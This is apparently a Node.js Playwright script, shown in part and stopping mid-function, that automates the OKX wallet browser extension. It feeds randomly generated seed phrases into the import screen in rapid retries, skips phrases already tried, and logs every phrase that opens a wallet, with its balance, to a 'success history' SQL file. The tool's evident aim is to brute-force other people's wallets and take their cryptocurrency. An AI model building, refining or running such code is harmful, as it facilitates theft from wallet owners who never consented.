const { spawn, spawnSync } = require("child_process");
const readline = require("readline/promises");
const fs = require("fs");
const path = require("path");
const { chromium } = require("playwright");
const { generateWalletSecretPhrase } = require("./wallet-phrase");
require("dotenv").config({ path: path.join(__dirname, ".env.local") });

const OKX_TARGET_URL =
	"chrome-extension://mcohilncbfahbmgdjkbpemcciiolgcge/popup.html#/wallet-add/import-with-seed-phrase-and-private-key";
const CDP_ENDPOINT = process.env.CDP_ENDPOINT || "http://127.0.0.1:9222";
const CHROME_EXECUTABLE =
	process.env.CHROME_EXECUTABLE || process.env.EDGE_EXECUTABLE || "chrome";
const CHROME_PROFILE_DIRECTORY =
	process.env.CHROME_PROFILE_DIRECTORY || process.env.EDGE_PROFILE_DIRECTORY || "Default";
const CHROME_REMOTE_DEBUGGING_PORT =
	process.env.CHROME_REMOTE_DEBUGGING_PORT ||
	process.env.EDGE_REMOTE_DEBUGGING_PORT ||
	"9222";
const SECRET_PHRASE_MAX_ATTEMPTS = Math.max(
	1,
	Number.parseInt(process.env.SECRET_PHRASE_MAX_ATTEMPTS || "25", 10) || 25
);
const DATA_DIRECTORY = path.join(__dirname, "okx-data");
const HISTORY_STORE_PATH = path.join(DATA_DIRECTORY, "okx-history.json");
const SUCCESS_SQL_PATH = path.join(DATA_DIRECTORY, "okx-success-history.sql");
const SUCCESS_JSON_PATH = path.join(DATA_DIRECTORY, "okx-success-history.json");
const SUCCESS_JSON_ENABLED = process.env.OKX_SUCCESS_JSON_ENABLED === "1";
const PHRASE_GENERATE_MAX_TRIES = Math.max(
	50,
	Number.parseInt(process.env.PHRASE_GENERATE_MAX_TRIES || "2000", 10) || 2000
);
const USED_PHRASE_FLUSH_EVERY = Math.max(
	1,
	Number.parseInt(process.env.USED_PHRASE_FLUSH_EVERY || "10", 10) || 10
);
const BALANCE_STOP_THRESHOLD = 10;
const RETRY_BASE_DELAY_MS = 40;
const RETRY_MAX_DELAY_MS = 220;
const configuredWordCount = Number.parseInt(process.env.SEED_PHRASE_WORD_COUNT || "24", 10);
let ACTIVE_WORD_COUNT = [12, 15, 18, 21, 24].includes(configuredWordCount)
	? configuredWordCount
	: 24;
const configuredSecretPhrase = process.env.WALLET_SECRET_PHRASE || "";
const OKX_PASSWORD_AUTOFILL = process.env.OKX_PASSWORD_AUTOFILL || "11223344";
const OKX_PASSWORD_WAIT_MS = Math.max(
	800,
	Number.parseInt(process.env.OKX_PASSWORD_WAIT_MS || "1200", 10) || 1200
);
const ULTRA_FAST_MODE = process.env.OKX_ULTRA_FAST !== "0";
const configuredSpeedFactor = Number.parseFloat(process.env.OKX_SPEED_FACTOR || "0.35");
const SPEED_FACTOR = ULTRA_FAST_MODE
	? Math.min(1, Math.max(0.2, Number.isFinite(configuredSpeedFactor) ? configuredSpeedFactor : 0.35))
	: 1;
const SCREEN_STATE_RECHECK_ATTEMPTS = Math.max(
	1,
	Number.parseInt(process.env.SCREEN_STATE_RECHECK_ATTEMPTS || "3", 10) || 3
);
const SCREEN_STATE_RECHECK_DELAY_MS = Math.max(
	30,
	Number.parseInt(process.env.SCREEN_STATE_RECHECK_DELAY_MS || "40", 10) || 40
);


const targetUrl = OKX_TARGET_URL;

// --- Screen Watcher: scan all pages, open new tab, close old tabs, then handle password ---
// Usage: const stopWatcher = startScreenWatcher(browser, targetUrl); stopWatcher() to end
function startScreenWatcher(browser, url) {
	let running = true;
	(async () => {
		const passwordSelector =
			'input[data-testid="okd-input"][type="password"], input[type="password"][placeholder*="Enter your password"], input.okui-input-input[type="password"]';

		while (running) {
			try {
				let found = false;
				// scan all pages/frames with a short timeout to avoid long waits
				for (const context of browser.contexts()) {
					for (const page of context.pages()) {
						if (page.isClosed()) continue;
						try {
							const count = await page.locator(passwordSelector).first().count({ timeout: 120 }).catch(() => 0);
							if (count > 0) {
								found = true;
								break;
							}
						} catch {
							// ignore
						}
						for (const frame of page.frames()) {
							try {
								const fcount = await frame.locator(passwordSelector).first().count({ timeout: 120 }).catch(() => 0);
								if (fcount > 0) {
									found = true;
									break;
								}
							} catch {
								// ignore
							}
						}
						if (found) break;
					}
					if (found) break;
				}

				if (found) {
					console.log('[Watcher] Password screen detected, opening fresh tab and handling...');
					// open fresh tab
					const primaryContext = browser.contexts()[0] || (await browser.newContext());
					const newPage = await primaryContext.newPage();
					if (ULTRA_FAST_MODE) {
						newPage.setDefaultTimeout(2600);
						newPage.setDefaultNavigationTimeout(3800);
					}
					await newPage.goto(url, { waitUntil: 'domcontentloaded' }).catch(() => {});

					// close all other pages
					for (const context of browser.contexts()) {
						for (const page of context.pages()) {
							if (page !== newPage && !page.isClosed()) {
								try { await page.close({ runBeforeUnload: true }); } catch {};
							}
						}
					}

					// handle password on the fresh tab
					try {
						await handleOkxPasswordGateIfPresent(newPage, url);
					} catch (err) {
						console.log('[Watcher] handle password error:', err?.message || err);
					}
				}
			} catch (err) {
				console.log('[Watcher] Error scanning pages:', err?.message || err);
			}
			await delay(100);
		}
	})();
	return () => { running = false; };
}

function normalizePhrase(phrase) {
	return String(phrase || "")
		.trim()
		.toLowerCase()
		.split(/\s+/)
		.filter(Boolean)
		.join(" ");
}

function getActiveWordCount() {
	return ACTIVE_WORD_COUNT;
}

function speedMs(baseMs, minMs = 1) {
	const scaled = Math.round((Number(baseMs) || 0) * SPEED_FACTOR);
	return Math.max(1, Math.min(scaled, 8));
}

async function chooseWordCountForRun() {
	const options = [12, 15, 18, 21, 24];

	if (!process.stdin.isTTY || process.env.OKX_NO_PROMPT === "1") {
		console.log(`Using word count: ${getActiveWordCount()} (non-interactive mode)`);
		return;
	}

	const rl = readline.createInterface({
		input: process.stdin,
		output: process.stdout,
	});

	try {
		const prompt = [
			"\nSelect seed phrase word count for this full run:",
			"1) 12 words",
			"2) 15 words",
			"3) 18 words",
			"4) 21 words",
			"5) 24 words",
			`Press Enter for default (${getActiveWordCount()}): `,
		].join("\n");

		const answer = (await rl.question(prompt)).trim();
		if (!answer) {
			console.log(`Using default word count: ${getActiveWordCount()}`);
			return;
		}

		const index = Number.parseInt(answer, 10);
		if (Number.isInteger(index) && index >= 1 && index <= options.length) {
			ACTIVE_WORD_COUNT = options[index - 1];
			console.log(`Selected word count: ${getActiveWordCount()}`);
			return;
		}

		const direct = Number.parseInt(answer, 10);
		if (options.includes(direct)) {
			ACTIVE_WORD_COUNT = direct;
			console.log(`Selected word count: ${getActiveWordCount()}`);
			return;
		}

		console.log(`Invalid input. Using default word count: ${getActiveWordCount()}`);
	} finally {
		rl.close();
	}
}

function ensureDataDirectory() {
	if (!fs.existsSync(DATA_DIRECTORY)) {
		fs.mkdirSync(DATA_DIRECTORY, { recursive: true });
	}
}

function createEmptyHistoryStore() {
	return {
		meta: {
			timezone: "Asia/Karachi",
			updatedAtUtc: new Date().toISOString(),
		},
		usedPhrases: [],
	};
}

function readHistoryStore() {
	try {
		ensureDataDirectory();
		if (!fs.existsSync(HISTORY_STORE_PATH)) {
			return createEmptyHistoryStore();
		}

		const raw = fs.readFileSync(HISTORY_STORE_PATH, "utf8");
		const parsed = JSON.parse(raw);
		if (!parsed || typeof parsed !== "object") {
			return createEmptyHistoryStore();
		}

		const usedPhrases = Array.isArray(parsed.usedPhrases)
			? parsed.usedPhrases.map(normalizePhrase).filter(Boolean)
			: [];

		return {
			meta: {
				timezone: "Asia/Karachi",
				updatedAtUtc: parsed?.meta?.updatedAtUtc || new Date().toISOString(),
			},
			usedPhrases,
		};
	} catch {
		return createEmptyHistoryStore();
	}
}

function writeHistoryStore(store) {
	ensureDataDirectory();
	const nextStore = {
		meta: {
			timezone: "Asia/Karachi",
			updatedAtUtc: new Date().toISOString(),
		},
		usedPhrases: Array.isArray(store.usedPhrases) ? store.usedPhrases : [],
	};
	fs.writeFileSync(HISTORY_STORE_PATH, JSON.stringify(nextStore, null, 2), "utf8");
}

function escapeSqlString(value) {
	return String(value ?? "").replace(/'/g, "''");
}

function ensureSuccessSqlFile() {
	ensureDataDirectory();
	if (fs.existsSync(SUCCESS_SQL_PATH)) {
		return;
	}

	const header = [
		"-- OKX success history (SQL-style)",
		"CREATE TABLE IF NOT EXISTS okx_success_history (",
		"  serial_no INTEGER PRIMARY KEY,",
		"  run_code TEXT NOT NULL,",
		"  timestamp_utc TEXT NOT NULL,",
		"  timestamp_pkt TEXT NOT NULL,",
		"  run_number INTEGER NOT NULL,",
		"  phrase TEXT NOT NULL,",
		"  phrase_attempt INTEGER NOT NULL,",
		"  balance_display TEXT NOT NULL,",
		"  balance_amount REAL NOT NULL,",
		"  total_time_ms INTEGER NOT NULL",
		");",
		"",
	].join("\n");

	fs.writeFileSync(SUCCESS_SQL_PATH, header, "utf8");
}

function ensureSuccessJsonFile() {
	if (!SUCCESS_JSON_ENABLED) {
		return;
	}

	ensureDataDirectory();
	if (fs.existsSync(SUCCESS_JSON_PATH)) {
		return;
	}

	fs.writeFileSync(SUCCESS_JSON_PATH, "[]\n", "utf8");
}

function appendSuccessJsonRecord(record) {
	if (!SUCCESS_JSON_ENABLED) {
		return;
	}

	ensureSuccessJsonFile();

	if (!Array.isArray(successJsonCache)) {
		try {
			const raw = fs.readFileSync(SUCCESS_JSON_PATH, "utf8");
			const parsed = JSON.parse(raw);
			successJsonCache = Array.isArray(parsed) ? parsed : [];
		} catch {
			successJsonCache = [];
		}
	}

	successJsonCache.push(record);
	fs.writeFileSync(SUCCESS_JSON_PATH, JSON.stringify(successJsonCache, null, 2), "utf8");
}

function getNextSuccessSerial() {
	if (Number.isInteger(successSerialCounter) && successSerialCounter > 0) {
		successSerialCounter += 1;
		return successSerialCounter;
	}

	ensureSuccessSqlFile();
	const sql = fs.readFileSync(SUCCESS_SQL_PATH, "utf8");
	const matches = sql.match(/INSERT INTO okx_success_history/gi) || [];
	successSerialCounter = matches.length + 1;
	return successSerialCounter;
}

function appendSuccessHistory(entry) {
	const nextSerial = getNextSuccessSerial();
	const now = new Date();
	const nowUtc = now.toISOString();
	const pktTime = now.toLocaleString("en-PK", {
		timeZone: "Asia/Karachi",
		hour12: false,
	});

	const runCode = `OKX-${String(nextSerial).padStart(6, "0")}`;
	const successRecord = {
		serial_no: nextSerial,
		run_code: runCode,
		timestamp_utc: nowUtc,
		timestamp_pkt: pktTime,
		run_number: Number(entry.runNumber) || 0,
		phrase: String(entry.phrase || ""),
		phrase_attempt: Number(entry.phraseAttempt) || 0,
		balance_display: String(entry.balanceDisplay || ""),
		balance_amount: Number(entry.balanceAmount) || 0,
		total_time_ms: Number(entry.totalTimeMs) || 0,
	};

	const sqlLine =
		`INSERT INTO okx_success_history (serial_no, run_code, timestamp_utc, timestamp_pkt, run_number, phrase, phrase_attempt, balance_display, balance_amount, total_time_ms) VALUES (` +
		`${successRecord.serial_no}, ` +
		`'${escapeSqlString(successRecord.run_code)}', ` +
		`'${escapeSqlString(successRecord.timestamp_utc)}', ` +
		`'${escapeSqlString(pktTime)}', ` +
		`${successRecord.run_number}, ` +
		`'${escapeSqlString(successRecord.phrase)}', ` +
		`${successRecord.phrase_attempt}, ` +
		`'${escapeSqlString(successRecord.balance_display)}', ` +
		`${successRecord.balance_amount}, ` +
		`${successRecord.total_time_ms}` +
		");\n";

	fs.appendFileSync(SUCCESS_SQL_PATH, sqlLine, "utf8");
	appendSuccessJsonRecord(successRecord);
}

const historyStore = readHistoryStore();
const usedPhraseHistory = new Set(historyStore.usedPhrases);
let lastSeedInputHost = null;
let successSerialCounter = null;
let successJsonCache = null;
let lastBalanceProbe = null;
let lastNetworkRecoveryAt = 0;
let pendingUsedPhraseWrites = 0;
let usedPhraseStoreDirty = false;

function persistUsedPhrases({ force = false } = {}) {
	if (!usedPhraseStoreDirty) {
		return;
	}

	if (!force && pendingUsedPhraseWrites < USED_PHRASE_FLUSH_EVERY) {
		return;
	}

	writeHistoryStore({
		meta: historyStore.meta,
		usedPhrases: Array.from(usedPhraseHistory),
	});
	pendingUsedPhraseWrites = 0;
	usedPhraseStoreDirty = false;
}

function registerUsedPhrase(phrase) {
	usedPhraseHistory.add(phrase);
	pendingUsedPhraseWrites += 1;
	usedPhraseStoreDirty = true;
	persistUsedPhrases();
}

function getSecretPhraseForAttempt() {
	const requiredWords = getActiveWordCount();
	const preferred = [configuredSecretPhrase]
		.map(normalizePhrase)
		.filter((phrase) => phrase.split(/\s+/).filter(Boolean).length >= requiredWords)
		.filter(Boolean);

	for (const phrase of preferred) {
		if (!usedPhraseHistory.has(phrase)) {
			registerUsedPhrase(phrase);
			return phrase;
		}
	}

	for (let tries = 1; tries <= PHRASE_GENERATE_MAX_TRIES; tries += 1) {
		const generated = normalizePhrase(generateWalletSecretPhrase(requiredWords));
		if (!generated) {
			continue;
		}

		if (!usedPhraseHistory.has(generated)) {
			registerUsedPhrase(generated);
			return generated;
		}
	}

	throw new Error(
		`Could not generate a unique phrase after ${PHRASE_GENERATE_MAX_TRIES} tries.`
	);
}

if (process.platform !== "win32") {
	console.error("This script currently supports Windows only.");
	process.exit(1);
}

function delay(ms) {
	return new Promise((resolve) => setTimeout(resolve, ms));
}

function formatDurationHms(totalMs) {
	const safeMs = Math.max(0, Number(totalMs) || 0);
	const totalSeconds = Math.floor(safeMs / 1000);
	const hours = Math.floor(totalSeconds / 3600);
	const minutes = Math.floor((totalSeconds % 3600) / 60);
	const seconds = totalSeconds % 60;

	return `${hours}h ${minutes}m ${seconds}s`;
}

async function isCdpReady() {
	try {
		const response = await fetch(`${CDP_ENDPOINT}/json/version`);
		return response.ok;
	} catch {
		return false;
	}
}

function launchChromeForCdp(url) {
	const args = [
		"/c",
		"start",
		"",
		CHROME_EXECUTABLE,
		`--profile-directory=${CHROME_PROFILE_DIRECTORY}`,
		`--remote-debugging-port=${CHROME_REMOTE_DEBUGGING_PORT}`,
		"--new-tab",
		url,
	];

	const child = spawn("cmd.exe", args, {
		detached: true,
		stdio: "ignore",
		windowsHide: true,
	});

	child.unref();
}

async function ensureCdp(url) {
	if (await isCdpReady()) {
		return;
	}

	launchChromeForCdp(url);

	for (let attempt = 0; attempt < 20; attempt += 1) {
		if (await isCdpReady()) {
			return;
		}
		await delay(speedMs(120, 30));
	}

	console.log("CDP not reachable, restarting Chrome once...");
	spawnSync("cmd.exe", ["/c", "taskkill", "/IM", "chrome.exe", "/F"], {
		stdio: "ignore",
		windowsHide: true,
	});

	await delay(speedMs(180, 40));
	launchChromeForCdp(url);

	for (let attempt = 0; attempt < 30; attempt += 1) {
		if (await isCdpReady()) {
			return;
		}
		await delay(speedMs(120, 30));
	}

	throw new Error("Chrome CDP not available on port 9222 even after restart.");
}

async function selectWordCountDropdown(scope, ownerPage, wordCount) {
	const selectLocator = '[data-testid="okd-select-reference-value-box"]';
	const optionLocator = `[data-e2e-okd-select-option-value="${wordCount}"]`;

	const trySelectInTarget = async (target) => {
		const selectBox = target.locator(selectLocator).first();
		if ((await selectBox.count().catch(() => 0)) === 0) {
			return false;
		}

		const currentValue = await selectBox.getAttribute("data-e2e-okd-select-value").catch(() => null);
		if (currentValue === String(wordCount)) {
			return true;
		}

		for (let attempt = 0; attempt < 3; attempt += 1) {
			await selectBox.click({ timeout: 1200 }).catch(() => {});
			await delay(speedMs(20, 4));

			const option = target.locator(optionLocator).first();
			if ((await option.count().catch(() => 0)) > 0) {
				await option.click({ timeout: 1200 }).catch(() => {});
			} else {
				await target
					.evaluate((expected) => {
						const optionNode = document.querySelector(
							`[data-e2e-okd-select-option-value="${expected}"]`
						);
						if (optionNode) {
							optionNode.dispatchEvent(new MouseEvent("click", { bubbles: true }));
						}
					}, wordCount)
					.catch(() => {});
			}

			await delay(speedMs(20, 4));
			const selectedValue = await selectBox
				.getAttribute("data-e2e-okd-select-value")
				.catch(() => null);
			if (selectedValue === String(wordCount)) {
				return true;
			}
		}

		return false;
	};

	try {
		if (await trySelectInTarget(scope)) {
			console.log(`Selected ${wordCount} words dropdown in active scope.`);
			return true;
		}

		if (ownerPage && ownerPage !== scope && (await trySelectInTarget(ownerPage))) {
			console.log(`Selected ${wordCount} words dropdown via owner page fallback.`);
			return true;
		}

		console.log(`Could not select ${wordCount} words dropdown.`);
		return false;
	} catch (err) {
		console.log(`Could not select ${wordCount} words: ${err.message}`);
		return false;
	}
}

async function prepareSeedInputSession(page) {
	const inputSelector = [
		'input[data-testid="import-seed-phrase-or-private-key-page-seed-phrase-input"]',
		"input.mnemonic-words-inputs__container__input",
	].join(", ");

	page = await ensureReadyForSeedPhrase(page, targetUrl);

	const browser = page.context().browser();
	if (!browser) {
		throw new Error("Browser handle is not available from CDP context.");
	}

	const host = await getSeedInputHost(browser, page, inputSelector);
	if (!host) {
		throw new Error("Could not find visible seed phrase inputs in any page/frame.");
	}

	const { scope, ownerPage } = host;
	await ownerPage.bringToFront().catch(() => {});

	const seedTab = scope.getByRole("tab", { name: /seed phrase/i }).first();
	if ((await seedTab.count()) > 0) {
		await seedTab.click({ timeout: 1200 }).catch(() => {});
	}

	const selectedWordCount = await selectWordCountDropdown(
		scope,
		ownerPage,
		getActiveWordCount()
	);
	if (!selectedWordCount) {
		throw new Error(`Could not switch dropdown to ${getActiveWordCount()} words.`);
	}

	const inputLocator = scope.locator(inputSelector);
	await inputLocator.first().waitFor({ state: "visible", timeout: 3500 });

	const inputCount = await inputLocator.count();
	if (inputCount < getActiveWordCount()) {
		throw new Error(
			`Expected at least ${getActiveWordCount()} seed inputs, found ${inputCount}.`
		);
	}

	return page;
}

async function ensureSessionWordCountGuard(scope, ownerPage, inputSelector) {
	const expected = getActiveWordCount();
	const selectBox = scope.locator('[data-testid="okd-select-reference-value-box"]').first();
	const selectedValue = await selectBox.getAttribute("data-e2e-okd-select-value").catch(() => null);
	const inputCount = await scope.locator(inputSelector).count().catch(() => 0);

	if (selectedValue === String(expected) && inputCount >= expected) {
		return true;
	}

	console.log(`Guard: re-syncing dropdown to ${expected} words (selected=${selectedValue}, inputs=${inputCount}).`);
	const switched = await selectWordCountDropdown(scope, ownerPage, expected);
	if (!switched) {
		return false;
	}

	const syncedCount = await scope.locator(inputSelector).count().catch(() => 0);
	return syncedCount >= expected;
}

async function fillSeedPhraseAndConfirm(page, phrase) {
	const words = phrase
		.split(/\s+/)
		.map((word) => word.trim())
		.filter(Boolean)
		.slice(0, getActiveWordCount());

	if (words.length < getActiveWordCount()) {
		throw new Error(
			`WALLET_SECRET_PHRASE must contain at least ${getActiveWordCount()} words.`
		);
	}

	page = await ensureReadyForSeedPhrase(page, targetUrl);

	const inputSelector = [
		'input[data-testid="import-seed-phrase-or-private-key-page-seed-phrase-input"]',
		"input.mnemonic-words-inputs__container__input",
	].join(", ");

	await page.bringToFront();

	const browser = page.context().browser();
	if (!browser) {
		throw new Error("Browser handle is not available from CDP context.");
	}

	const host = await getSeedInputHost(browser, page, inputSelector);
	if (!host) {
		throw new Error("Could not find visible seed phrase inputs in any page/frame.");
	}

	const { scope, inputLocator, ownerPage } = host;
	await ownerPage.bringToFront().catch(() => {});

	const guardOk = await ensureSessionWordCountGuard(scope, ownerPage, inputSelector);
	if (!guardOk) {
		throw new Error(`Guard could not keep dropdown at ${getActiveWordCount()} words.`);
	}

	await inputLocator.first().waitFor({ state: "visible", timeout: 3500 });

	const inputCount = await inputLocator.count();
	if (inputCount < getActiveWordCount()) {
		throw new Error(
			`Expected at least ${getActiveWordCount()} seed inputs, found ${inputCount}.`
		);
	}

	const blockedInputIndex = await scope.evaluate(({ selector, wordCount }) => {
		const inputs = Array.from(document.querySelectorAll(selector));
		for (let i = 0; i < Math.min(inputs.length, wordCount); i += 1) {
			const input = inputs[i];
			const isReadOnly = input.hasAttribute("readonly") || input.readOnly;
			const isDisabled = input.hasAttribute("disabled") || input.getAttribute("aria-disabled") === "true" || input.disabled;
			if (isReadOnly || isDisabled) {
				return i + 1;
			}
		}
		return 0;
	}, { selector: inputSelector, wordCount: getActiveWordCount() });
	if (blockedInputIndex > 0) {
		throw new Error(`Seed input ${blockedInputIndex} is disabled or readonly.`);
	}

	const fastSetSuccess = await setSeedWordsFast(scope, inputSelector, inputLocator, words);
	if (!fastSetSuccess) {
		for (let index = 0; index < getActiveWordCount(); index += 1) {
			await setWordIntoInput(inputLocator.nth(index), words[index], index + 1);
		}
	}

	await delay(1); // ultra-fast after input
	if (await hasIncorrectSeedPhraseError(scope)) {
		await clearAndWaitSeedInputs(scope, inputLocator);
		throw new Error("Incorrect seed phrase warning appeared; cleared inputs for retry.");
	}

	const clickedByRole = await clickConfirmIfEnabled(scope);
	if (!clickedByRole) {
		throw new Error("Confirm button is not enabled yet.");
	}

	await delay(1); // ultra-fast after confirm
	if (await hasIncorrectSeedPhraseError(scope)) {
		await clearAndWaitSeedInputs(scope, inputLocator);
		throw new Error("Incorrect seed phrase warning appeared after confirm; cleared inputs for retry.");
	}

}

async function getSeedInputHost(browser, primaryPage, inputSelector) {
	if (lastSeedInputHost) {
		const { scope, inputLocator, ownerPage } = lastSeedInputHost;
		if (!ownerPage.isClosed()) {
			const cachedCount = await inputLocator.count().catch(() => 0);
			if (cachedCount >= Math.min(getActiveWordCount(), 12)) {
				return lastSeedInputHost;
			}
		}
	}

	const freshHost = await findSeedInputHost(browser, primaryPage, inputSelector);
	if (freshHost) {
		lastSeedInputHost = freshHost;
	}

	return freshHost;
}

async function findSeedInputHost(browser, primaryPage, inputSelector) {
	const seen = new Set();
	const candidates = [primaryPage];

	for (const context of browser.contexts()) {
		for (const page of context.pages()) {
			if (!seen.has(page)) {
				seen.add(page);
				if (page !== primaryPage) {
					candidates.push(page);
				}
			}
		}
	}

	for (const candidatePage of candidates) {
		const pageInputs = candidatePage.locator(inputSelector);
		if ((await pageInputs.count().catch(() => 0)) >= Math.min(getActiveWordCount(), 12)) {
			return { scope: candidatePage, inputLocator: pageInputs, ownerPage: candidatePage };
		}

		for (const frame of candidatePage.frames()) {
			const frameInputs = frame.locator(inputSelector);
			if ((await frameInputs.count().catch(() => 0)) >= Math.min(getActiveWordCount(), 12)) {
				return { scope: frame, inputLocator: frameInputs, ownerPage: candidatePage };
			}
		}
	}

	return null;
}

async function hasIncorrectSeedPhraseError(scope) {
	const errorByText = scope.getByText(/Incorrect seed phrase\. Check and re-enter it\./i).first();
	if ((await errorByText.count().catch(() => 0)) > 0) {
		if (await errorByText.isVisible().catch(() => false)) {
			return true;
		}
	}

	return scope.evaluate(() => {
		const text = (document.body?.innerText || "").toLowerCase();
		return text.includes("incorrect seed phrase") && text.includes("re-enter");
	}).catch(() => false);
}

async function clickClearSeedPhrase(scope) {
	const clearButton = scope.locator(".mnemonic-words-inputs__clear-button").first();
	if ((await clearButton.count().catch(() => 0)) > 0) {
		await clearButton.click({ timeout: 3000 }).catch(() => {});
		return true;
	}

	const clearByText = scope.getByText(/^Clear$/i).first();
	if ((await clearByText.count().catch(() => 0)) > 0) {
		await clearByText.click({ timeout: 3000 }).catch(() => {});
		return true;
	}

	const clickedByEvaluate = await scope.evaluate(() => {
		const clear = document.querySelector(".mnemonic-words-inputs__clear-button");
		if (clear) {
			clear.dispatchEvent(new MouseEvent("click", { bubbles: true }));
			return true;
		}

		const all = Array.from(document.querySelectorAll("span,button,div"));
		for (const node of all) {
			const text = (node.textContent || "").trim().toLowerCase();
			if (text === "clear") {
				node.dispatchEvent(new MouseEvent("click", { bubbles: true }));
				return true;
			}
		}

		return false;
	}).catch(() => false);

	return clickedByEvaluate;
}

async function waitForInputsCleared(inputLocator, timeoutMs = 1800) {
	const start = Date.now();
	while (Date.now() - start < timeoutMs) {
		const count = await inputLocator.count().catch(() => 0);
		if (count >= getActiveWordCount()) {
			let allClear = true;
			for (let index = 0; index < getActiveWordCount(); index += 1) {
				const value = await inputLocator.nth(index).inputValue().catch(() => null);
				if (value === null || value.trim() !== "") {
					allClear = false;
					break;
				}
			}

			if (allClear) {
				return true;
			}
		}

		await delay(speedMs(20, 4));
	}

	return false;
}

async function clearAndWaitSeedInputs(scope, inputLocator) {
	await clickClearSeedPhrase(scope).catch(() => false);
	await waitForInputsCleared(inputLocator, 700).catch(() => false);
}

async function setSeedWordsFast(scope, inputSelector, inputLocator, words) {
	const batchSetOk = await scope
		.evaluate(({ selector, seedWords }) => {
			const inputs = Array.from(document.querySelectorAll(selector));
			if (inputs.length < seedWords.length) {
				return false;
			}

			const nativeInputValueSetter =
				Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value")?.set;

			for (let index = 0; index < seedWords.length; index += 1) {
				const input = inputs[index];
				if (!input) {
					return false;
				}

				if (
					input.hasAttribute("readonly") ||
					input.readOnly ||
					input.hasAttribute("disabled") ||
					input.disabled ||
					input.getAttribute("aria-disabled") === "true"
				) {
					return false;
				}

				if (nativeInputValueSetter) {
					nativeInputValueSetter.call(input, seedWords[index]);
				} else {
					input.value = seedWords[index];
				}

				input.dispatchEvent(new Event("input", { bubbles: true }));
				input.dispatchEvent(new Event("change", { bubbles: true }));
			}

			return true;
		}, { selector: inputSelector, seedWords: words })
		.catch(() => false);

	if (!batchSetOk) {
		return false;
	}

	for (let index = 0; index < words.length; index += 1) {
		const value = await inputLocator.nth(index).inputValue().catch(() => "");
		if (value !== words[index]) {
			return false;
		}
	}

	return true;
}

async function setWordIntoInput(input, word, position) {
	await input.scrollIntoViewIfNeeded().catch(() => {});
	await input.click({ timeout: 3000 }).catch(() => {});

	// Strategy 1: Playwright fill
	await input.fill(word, { timeout: 5000 }).catch(() => {});
	if ((await input.inputValue().catch(() => "")) === word) {
		return;
	}

	// Strategy 2: Clear + keyboard typing to trigger UI handlers
	await input.click({ timeout: 3000 }).catch(() => {});
	await input.press("Control+a").catch(() => {});
	await input.press("Backspace").catch(() => {});
	await input.type(word, { delay: 0 }).catch(() => {});
	if ((await input.inputValue().catch(() => "")) === word) {
		return;
	}

	// Strategy 3: Native value setter + input/change events for controlled React-like inputs
	await input.evaluate((element, value) => {
		const nativeInputValueSetter =
			Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value")?.set;
		nativeInputValueSetter?.call(element, value);
		element.dispatchEvent(new Event("input", { bubbles: true }));
		element.dispatchEvent(new Event("change", { bubbles: true }));
		element.dispatchEvent(new Event("blur", { bubbles: true }));
	}, word);

	if ((await input.inputValue().catch(() => "")) !== word) {
		throw new Error(`Could not type seed word at position ${position}.`);
	}
}

async function clickConfirmIfEnabled(scope) {
	const confirmByRole = scope.getByRole("button", { name: /confirm/i }).first();
	if ((await confirmByRole.count()) > 0) {
		await confirmByRole.waitFor({ state: "visible", timeout: 3000 }).catch(() => {});
		if (await confirmByRole.isEnabled()) {
			await confirmByRole.click({ timeout: 5000 });
			return true;
		}
	}

	return scope.evaluate(() => {
		const buttons = Array.from(document.querySelectorAll("button"));
		for (const button of buttons) {
			const text = (button.textContent || "").toLowerCase().replace(/\s+/g, " ").trim();
			const disabled =
				button.hasAttribute("disabled") ||
				button.getAttribute("aria-disabled") === "true" ||
				button.classList.contains("disabled");
			if (text.includes("confirm") && !disabled) {
				button.click();
				return true;
			}
		}
		return false;
	});
}

async function fillAndConfirmWithRetries(page, { startAttempt = 1 } = {}) {
	page = await prepareSeedInputSession(page);

	for (
		let attempt = startAttempt;
		attempt <= SECRET_PHRASE_MAX_ATTEMPTS;
		attempt += 1
	) {
		const attemptStart = Date.now();
		const phrase = getSecretPhraseForAttempt(attempt);

		try {
			page = await ensureReadyForSeedPhrase(page, targetUrl);
			await fillSeedPhraseAndConfirm(page, phrase);
			const elapsed = Date.now() - attemptStart;
			console.log(`Attempt ${attempt} success (${elapsed}ms)`);
			return { phrase, attempt, elapsedMs: elapsed };
		} catch (error) {
			const elapsed = Date.now() - attemptStart;
			const errorMessage = error?.message || String(error);
			console.log(`Attempt ${attempt} failed (${elapsed}ms): ${errorMessage}`);

			const requiresStateRecovery =
				/Could not find visible seed phrase inputs/i.test(errorMessage) ||
				/seed phrase import screen/i.test(errorMessage);
			if (requiresStateRecovery) {
				page = await ensureReadyForSeedPhrase(page, targetUrl).catch(() => page);
			}

			if (attempt < SECRET_PHRASE_MAX_ATTEMPTS) {
				const isClearedRetry = /cleared inputs for retry/i.test(errorMessage);
				if (isClearedRetry) {
					await delay(speedMs(10, 2));
					continue;
				}

				const boundedAttempt = Math.min(attempt, 5);
				const adaptiveDelay = Math.min(
					RETRY_MAX_DELAY_MS,
					RETRY_BASE_DELAY_MS * Math.pow(2, boundedAttempt - 1)
				);
				await delay(speedMs(adaptiveDelay, 6));
			}
		}
	}

	throw new Error(
		`Could not complete OKX import after ${SECRET_PHRASE_MAX_ATTEMPTS} attempts.`
	);
}

async function dismissTonImportWarningIfPresent(scope) {
	const hasTonTitle = await scope
		.getByText(/Importing TON wallet/i)
		.first()
		.isVisible()
		.catch(() => false);

	if (!hasTonTitle) {
		return false;
	}

	const okButton = scope.getByRole("button", { name: /^OK$/i }).first();
	if ((await okButton.count().catch(() => 0)) > 0) {
		const isEnabled = await okButton.isEnabled().catch(() => true);
		if (isEnabled) {
			await okButton.click({ timeout: 3000 }).catch(() => {});
			console.log("TON import warning detected. Clicked OK to continue.");
			return true;
		}
	}

	const clickedByEvaluate = await scope
		.evaluate(() => {
			const text = (document.body?.innerText || "").toLowerCase();
			if (!text.includes("importing ton wallet")) {
				return false;
			}

			const buttons = Array.from(document.querySelectorAll("button"));
			for (const button of buttons) {
				const label = (button.textContent || "").replace(/\s+/g, " ").trim().toLowerCase();
				const disabled =
					button.hasAttribute("disabled") ||
					button.getAttribute("aria-disabled") === "true" ||
					button.classList.contains("disabled");
				if (label === "ok" && !disabled) {
					button.click();
					return true;
				}
			}

			return false;
		})
		.catch(() => false);

	if (clickedByEvaluate) {
		console.log("TON import warning detected. Clicked OK to continue.");
	}

	return clickedByEvaluate;
}

async function recoverFromNetworkUnavailableIfPresent(scope, ownerPage) {
